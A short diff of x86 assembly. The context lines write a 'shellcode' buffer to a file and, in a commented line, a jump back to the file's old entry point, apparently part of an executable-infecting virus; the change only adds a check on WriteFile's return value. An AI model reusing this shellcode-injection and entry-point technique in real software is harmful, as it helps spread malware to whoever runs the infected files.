@@ -486,7 +486,7 @@ push 	eax
 push	offset shellcode
 push	filePointer
 call		WriteFile
-
+cmp	eax, 0
 
 ;invoke    WriteFile, filePointer, &decallage, sizeof(DWORD), &size, NULL							;writing jmp operand oldEntryPoint
 push	0
